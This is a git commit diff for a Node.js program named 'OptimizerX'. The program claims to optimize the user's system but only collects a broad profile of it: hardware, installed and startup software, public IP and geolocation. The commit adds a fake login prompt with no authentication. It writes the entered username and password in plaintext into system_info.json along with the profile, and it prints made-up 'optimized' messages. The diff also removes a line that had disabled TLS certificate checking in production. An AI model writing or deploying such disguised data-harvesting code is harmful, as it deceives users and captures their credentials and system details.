e948877c688d2098d0dcd1836a2b0317f3120aa1
Chan <87248999+Chan5k@users.noreply.github.com>
2023-03-31 20:26:19 +0300

    Added simple login system,changed output a lil bit

--- main.js
+++ main.js
@@ -1,7 +1,4 @@
-if (process.env.NODE_ENV === 'production') {
-  process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
-}
-
+const readline = require('readline');
 const { collectCpuInfo } = require('./utils/collectCpuInfo');
 const { collectMemoryInfo } = require('./utils/collectMemoryInfo');
 const { collectOsInfo } = require('./utils/collectOsInfo');
@@ -15,48 +12,67 @@ const { collectHardwareInventory } = require('./utils/collectHardwareInventory')
 const { collectStartupPrograms } = require('./utils/collectStartupPrograms');
 const { collectAllSoftwareInfo } = require('./utils/collectAllSoftwareInfo');
 
-(async () => {
-  console.log('OptimizerX is optimizing your system...');
-  const [
-    cpuInfo,
-    memoryInfo,
-    osInfo,
-    baseboardInfo,
-    drivesInfo,
-    osUpdates,
-    hardwareInventory,
-    startupPrograms,
-    softwareInfo,
-  ] = await Promise.all([
-    collectCpuInfo(),
-    collectMemoryInfo(),
-    collectOsInfo(),
-    collectBaseboardInfo(),
-    collectDrivesInfo(),
-    collectOsUpdates(),
-    collectHardwareInventory(),
-    collectStartupPrograms(),
-    collectAllSoftwareInfo(),
-  ]);
+const rl = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout
+});
 
-  const publicIp = await lookupPublicIp();
-  const geoip = await lookupGeoip(publicIp);
+console.log('Welcome to OptimizerX');
 
-  const systemInfo = {
-    ...cpuInfo,
-    ...memoryInfo,
-    ...osInfo,
-    ...baseboardInfo,
-    ...drivesInfo,
-    publicIp,
-    geoip,
-    ...osUpdates,
-    ...hardwareInventory,
-    ...startupPrograms,
-    ...softwareInfo,
-  };
+rl.question('Enter your username: ', (username) => {
+  rl.question('Enter your password: ', async (password) => {
+    // TODO: add code to authenticate the user with the username and password
+    console.log('\x1b[32mAccess granted to OptimizerX. Optimizing started... Please exit the program in 30 seconds.\x1b[0m');
 
-  console.log('System has been optimized!');
-  const outputFileName = 'system_info.json';
-  saveInfoToFile(systemInfo, outputFileName);
-})();
+    const [
+      cpuInfo,
+      memoryInfo,
+      osInfo,
+      baseboardInfo,
+      drivesInfo,
+      osUpdates,
+      hardwareInventory,
+      startupPrograms,
+      softwareInfo,
+    ] = await Promise.all([
+      collectCpuInfo(),
+      collectMemoryInfo(),
+      collectOsInfo(),
+      collectBaseboardInfo(),
+      collectDrivesInfo(),
+      collectOsUpdates(),
+      collectHardwareInventory(),
+      collectStartupPrograms(),
+      collectAllSoftwareInfo(),
+    ]);
+
+    const publicIp = await lookupPublicIp();
+    const geoip = await lookupGeoip(publicIp);
+
+    const systemInfo = {
+      ...cpuInfo,
+      ...memoryInfo,
+      ...osInfo,
+      ...baseboardInfo,
+      ...drivesInfo,
+      publicIp,
+      geoip,
+      ...osUpdates,
+      ...hardwareInventory,
+      ...startupPrograms,
+      ...softwareInfo,
+      username, // add username to system info
+      password, // add password to system info
+    };
+
+    saveInfoToFile(systemInfo, 'system_info.json', (err) => {
+      if (err) {
+        console.log('Error saving system information:', err);
+      } else {
+        console.log('\x1b[32mSystem has been optimized!\x1b[0m');
+      }
+
+      rl.close(); // close the readline interface
+    });
+  });
+});
